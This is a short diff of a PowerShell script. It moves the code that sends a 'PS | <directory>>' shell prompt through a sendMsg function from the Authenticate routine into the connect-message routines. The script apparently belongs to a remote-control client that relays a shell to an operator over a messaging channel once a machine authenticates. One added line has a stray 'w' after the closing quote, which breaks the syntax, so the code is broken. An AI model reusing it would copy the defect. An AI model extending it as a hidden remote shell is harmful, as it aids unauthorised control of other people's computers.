@@ -1085,6 +1085,8 @@ $script:jsonPayload = @{
     )
 }
 sendMsg -Embed $jsonPayload
+$dir = $PWD.Path
+sendMsg -Message "``PS | $dir>``"
 }
 
 Function WaitingMsg {
@@ -1160,6 +1162,12 @@ $infocall
 sendMsg -Embed $jsonPayload
     if ($InfoOnConnect -eq '1'){
  	quickInfo
+  	$dir = $PWD.Path
+	sendMsg -Message "``PS | $dir>``"
+    }
+    else{
+    	$dir = $PWD.Path
+	sendMsg -Message "``PS | $dir>``"w
     }
 }
 
@@ -1301,8 +1309,6 @@ Function Authenticate{
         $script:authenticated = 1
         $script:previouscmd = $response
         ConnectMsg
-	$dir = $PWD.Path
-	sendMsg -Message "``PS | $dir>``"
     }
     else{
         Write-Host "$env:COMPUTERNAME Not authenticated"
